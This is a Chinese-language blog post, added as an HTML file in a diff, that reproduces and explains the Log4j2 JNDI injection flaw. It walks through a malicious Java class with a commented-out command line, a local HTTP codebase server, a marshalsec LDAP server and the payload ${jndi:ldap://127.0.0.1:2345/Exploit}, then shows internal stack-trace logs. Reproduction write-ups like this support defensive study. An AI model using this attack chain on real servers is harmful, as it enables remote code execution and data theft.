@@ -1,0 +1,260 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>安全｜Log4j2 复现与原理 | York Zhang&#39;s Blog</title>
+<link rel="shortcut icon" href="https://yao177.github.io/favicon.ico?v=1646131663365">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://yao177.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="安全｜Log4j2 复现与原理 | York Zhang&#39;s Blog - Atom Feed" href="https://yao177.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="漏洞复现
+利用条件：
+靶机需要能访问外网，若 jdk8 需要小于 u124
+Web服务器
+任意未更新 log4j 至最新版的服务，以 crm（本人负责服务）为例。
+CodeBase服务器
+直接用 python 自带的 SimpleHttpS..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://yao177.github.io">
+  <img class="avatar" src="https://yao177.github.io/images/avatar.png?v=1646131663365" alt="">
+  </a>
+  <h1 class="site-title">
+    York Zhang&#39;s Blog
+  </h1>
+  <p class="site-description">
+    <b>E</b>·rror = <b>m</b>·ore * <b>c²</b>·ode
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/yao177" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Tianyao_Z" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/p/1005055415293764" target="_blank">
+          <i class="ri-weibo-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://www.zhihu.com/people/yao-zi-73-1" target="_blank">
+          <i class="ri-zhihu-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://www.facebook.com/York.Z9859" target="_blank">
+          <i class="ri-facebook-line"></i>
+        </a>
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              安全｜Log4j2 复现与原理
+            </h2>
+            <div class="post-info">
+              <span>
+                03-01-2022
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="漏洞复现">漏洞复现</h1>
+<h2 id="利用条件">利用条件：</h2>
+<p>靶机需要能访问外网，若 jdk8 需要小于 u124</p>
+<h2 id="web服务器">Web服务器</h2>
+<p>任意未更新 log4j 至最新版的服务，以 crm（本人负责服务）为例。</p>
+<h2 id="codebase服务器">CodeBase服务器</h2>
+<p>直接用 python 自带的 SimpleHttpServer 即可。将恶意 class 放入目录下。</p>
+<pre><code class="language-Java">public class Exploit {
+    static {
+//        try {
+//            Runtime.getRuntime().exec(&quot;reboot&quot;); 可以是任意代码，例如关机指令、进程关闭、将服务器文件外传、将内网拓扑结构外传、嵌入挖矿软件，any
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        } 
+        System.out.println(&quot;Exploit!&quot;);
+    }
+}
+</code></pre>
+<p>启动服务器：python3 -m SimpleHTTPServer 1234</p>
+<p>于是得到 codebase 地址：http://127.0.0.1:1234/</p>
+<h2 id="ldap服务器">LDAP服务器</h2>
+<p>随便找个LDAP简易服务器框架，例如https://github.com/mbechler/marshalsec</p>
+<p>该框架运行参数为<code>&lt;codebase_url#classname&gt; [&lt;port&gt;]</code></p>
+<p>我们测试时设置为：http://127.0.0.1:1234/#Exploit 2345</p>
+<h2 id="复现">复现</h2>
+<p>已知 controller 会打印参数信息，于是我们搜索：<br>
+<img src="https://yao177.github.io/post-images/1646129092453.png" alt="" loading="lazy"></p>
+<p>payload：<code>${jndi:ldap://127.0.0.1:2345/Exploit}</code><br>
+得到：<br>
+<img src="https://yao177.github.io/post-images/1646129683700.png" alt="" loading="lazy"></p>
+<p>相关利用姿势：上传堆栈、上传业务类字节码，而后可以将所有源码看尽。</p>
+<h2 id="完整攻击链">完整攻击链</h2>
+<p>总结完整攻击链：<br>
+<img src="https://yao177.github.io/post-images/1646129822790.svg" alt="" loading="lazy"></p>
+<p>该漏洞及其危险，黑客只需额外两台服务器，并在任何可能被日志打印的接口参数中嵌入恶意信息即可。若靶机 jdk 版本大于等于 u124，那将无法复现解析 reference 以访问 codebase 服务器。</p>
+<h1 id="漏洞原理">漏洞原理</h1>
+<h2 id="log4j">log4j</h2>
+<figure data-type="image" tabindex="1"><img src="https://yao177.github.io/post-images/1646130822954.png" alt="" loading="lazy"></figure>
+<p>绕过冒号前缀校验</p>
+<figure data-type="image" tabindex="2"><img src="https://yao177.github.io/post-images/1646130861459.png" alt="" loading="lazy"></figure>
+<p>将特殊指令解析为 jndi 指令=<br>
+访问 LDAP 服务器，接收构造好的指向外部的 Reference（有两种传输方式，一种Reference，一种本地序列化）</p>
+<figure data-type="image" tabindex="3"><img src="https://yao177.github.io/post-images/1646130936561.png" alt="" loading="lazy"></figure>
+<p>web 服务器接收后，反序列化 reference，并从 codebase 的URL对象中获取字节流：</p>
+<p><img src="https://yao177.github.io/post-images/1646130973181.png" alt="" loading="lazy"><br>
+<img src="https://yao177.github.io/post-images/1646130999277.png" alt="" loading="lazy"><br>
+<img src="https://yao177.github.io/post-images/1646131017114.png" alt="" loading="lazy"><br>
+<img src="https://yao177.github.io/post-images/1646131035747.png" alt="" loading="lazy"></p>
+<p>利用我们定义的 javaFactory 进行类加载，还记得我们的设定么：</p>
+<figure data-type="image" tabindex="4"><img src="https://yao177.github.io/post-images/1646131063716.png" alt="" loading="lazy"></figure>
+<p>这个ref便是我们的HTTP服务器：http://127.0.0.1:1234/，至此完成攻击。</p>
+<h1 id="example">Example</h1>
+<p>*ppo login、5*8 online</p>
+<pre><code class="language-Java"> com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), 
+ com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0(MsgLogConsumer.java:78), com.bj58.spat.w')
+(['Sat Dec 11 21:06:39 2021'], ':', 'ender.append(AbstractOutputStreamAppender.java:108), org.apache.logging.log4j.core.appender.RollingFileAppender.append(RollingFileAppender.java:88), org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:99), org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:430), org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:409), org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:367), org.apache.logging.log4j.core.Logger.logMessage(Logger.java:112), org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:738), org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:708), org.apache.logging.slf4j.Log4jLogger.info(Log4jLogger.java:193), com.bj58.spat.wcs.consultstatistics.modules.kafka.KafkaConsumerTool.printLog(KafkaConsumerTool.java:42), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0(MsgLogConsumer.java:78), com.bj58.spat.w')
+('receive from 2:', 'cs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0$accessor$LturF6aU(MsgLogConsumer.java), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2$auxiliary$DWlZw7JW.call(Unknown Source), org.apache.skywalking.apm.plugin.jdk.threading.ThreadingMethodInterceptor_internal.intercept(InstanceMethodInterTemplate.java:93), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run(MsgLogConsumer.java)]\n')
+(['Sat Dec 11 21:06:39 2021'], ':', 'cs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run$original$J2L3KrD0$accessor$LturF6aU(MsgLogConsumer.java), 
+com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2$auxiliary$DWlZw7JW.call(Unknown Source), 
+org.apache.skywalking.apm.plugin.jdk.threading.ThreadingMethodInterceptor_internal.intercept(InstanceMethodInterTemplate.java:93), com.bj58.spat.wcs.consultstatistics.modules.kafka.consumers.MsgLogConsumer$2.run(MsgLogConsumer.java)]\n')
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a>
+<ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6">利用条件：</a></li>
+<li><a href="#web%E6%9C%8D%E5%8A%A1%E5%99%A8">Web服务器</a></li>
+<li><a href="#codebase%E6%9C%8D%E5%8A%A1%E5%99%A8">CodeBase服务器</a></li>
+<li><a href="#ldap%E6%9C%8D%E5%8A%A1%E5%99%A8">LDAP服务器</a></li>
+<li><a href="#%E5%A4%8D%E7%8E%B0">复现</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE">完整攻击链</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a>
+<ul>
+<li><a href="#log4j">log4j</a></li>
+</ul>
+</li>
+<li><a href="#example">Example</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+
+        <div class="site-footer">
+  <b>York</b>'s home | wish you a nice day!
+  <a class="rss" href="https://yao177.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
